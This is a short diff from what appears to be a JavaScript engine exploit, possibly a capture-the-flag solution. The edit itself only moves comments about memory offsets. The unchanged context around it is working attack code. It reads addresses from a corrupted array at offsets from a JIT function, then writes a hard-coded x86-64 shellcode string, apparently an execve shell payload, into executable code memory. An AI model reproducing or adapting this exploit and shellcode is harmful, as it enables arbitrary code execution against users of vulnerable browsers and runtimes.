@@ -59,11 +59,9 @@ for(let i=0;i<1000;i++){
 dprint(arr);
 dprint(targetf);
 dprint(arrbuf);
-//code = JSFUntion + 0x30
-//instruction = code + 0x60
 var foffset = 0x80;
 var bufoffset = foffset + 0x40;
-var codeaddr =  arr[(foffset+0x30)/8];
+var codeaddr =  arr[(foffset+0x30)/8]; //code = JSFUntion + 0x30
 var storeaddr = arr[(bufoffset+0x20)/8];
 console.log('code : ' + d2s(codeaddr));
 console.log('store : ' + d2s(storeaddr));
@@ -76,6 +74,7 @@ var u8arr = new Uint8Array(arrbuf);
 var shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
 
 for(let i=0;i<shellcode.length;i++){
+  //instruction_start = code + 0x60
   u8arr[i+0x60] = shellcode.charCodeAt(i)
 }
 
